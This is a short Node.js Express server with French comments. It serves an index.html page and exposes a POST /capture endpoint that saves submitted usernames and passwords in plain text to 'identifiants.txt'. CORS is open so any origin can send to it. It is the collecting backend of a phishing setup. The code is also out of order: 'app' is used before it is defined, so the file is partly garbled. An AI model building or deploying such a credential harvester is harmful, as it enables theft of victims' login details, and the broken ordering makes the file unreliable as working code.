const path = require('path');

// Sert les fichiers statiques (ton index.html) qui sont dans le même dossier
app.use(express.static(__dirname));

// Route pour afficher la page d'accueil
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();
// Remplace : const PORT = 3000;
// Par :
const PORT = process.env.PORT || 3000;
// Autorise le serveur à recevoir des données JSON et à accepter les requêtes provenant d'autres sites (CORS)
app.use(cors());
app.use(express.json());

app.post('/capture', (req, res) => {
    const { username, password } = req.body;
    const data = `Utilisateur: ${username} | MDP: ${password} | Date: ${new Date().toLocaleString()}\n`;

    // Écrit (ou ajoute) les données dans le fichier .txt
    fs.appendFile('identifiants.txt', data, (err) => {
        if (err) {
            console.error("Erreur d'écriture :", err);
            return res.status(500).send("Erreur serveur");
        }
        console.log("Données reçues et sauvegardées !");
        res.status(200).send("OK");
    });
});

app.listen(PORT, () => {
    console.log(`Serveur d'écoute lancé sur http://localhost:${PORT}`);
});